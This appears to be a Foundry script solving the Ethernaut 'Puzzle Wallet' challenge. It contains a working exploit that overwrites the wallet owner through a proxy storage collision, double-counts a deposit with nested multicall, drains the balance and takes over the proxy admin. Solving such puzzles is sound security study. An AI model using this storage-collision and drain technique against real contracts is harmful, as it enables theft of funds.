// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/PuzzleWallet.sol";

contract PuzzleWalletSolve is Script{
    PuzzleProxy public proxy = PuzzleProxy(payable(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2));
    PuzzleWallet public wallet = PuzzleWallet(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        Attack attack = new Attack();

        attack.exploit{value: 0.001 ether}();


        console.log("Wallet Owner  :", wallet.owner());
        console.log("Proxy Admin :", proxy.admin());
        console.log("Wallet Max Balance : ", wallet.maxBalance());
        console.log("Proxy Pending Admin : ", proxy.pendingAdmin());
        console.log("Wallet balance : ", address(wallet).balance);

        vm.stopBroadcast();
    }
}


contract Attack {
    PuzzleProxy public proxy = PuzzleProxy(payable(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2));
    PuzzleWallet public wallet = PuzzleWallet(0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2);

    function exploit() payable public{
        proxy.proposeNewAdmin(address(this)); // Changes pendingAdmin in Proxy and overwrites owner in Wallet

        wallet.addToWhitelist(address(this));

        // To set maxPrice ==> Wallet Balance should be 0, But Initiall Wallet Balance : 1000000000000000 (0.001 ETH)
        // Make Wallet Balance 0

        // use multicall to call deposit and multicall again with 0.001 eth

        bytes[] memory _depositSelector = new bytes[](1) ;
        _depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);

        
        bytes[] memory _nestedMulti = new bytes[](2);
        _nestedMulti[0] = abi.encodeWithSelector(wallet.deposit.selector);
        _nestedMulti[1] = abi.encodeWithSelector(wallet.multicall.selector, _depositSelector);  // multicall calldata
        // [deposit selector, multicall selector [deposit] ]
        wallet.multicall{value: 0.001 ether}(_nestedMulti);

        // Wallet Balance : 0.002 ETH
        // Balance[msg.sender] = Balance[Attacker] = 0.003 ETH

        // Call Execute function with amount 0.002

        wallet.execute(address(this), 0.002 ether, "");


        // Now Wallet Balance ==> 0

        // wallet.setMaxBalance(uint256(uint160(address(this))));
        
        wallet.setMaxBalance(uint256(uint160(address(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602)))); // sets proxyAdmin



    }

    receive() payable external{}

}

/*
            // Proxy                            // Wallet
        address public pendingAdmin;    |  address public owner;
        address public admin;           |  uint256 public maxBalance;
*/

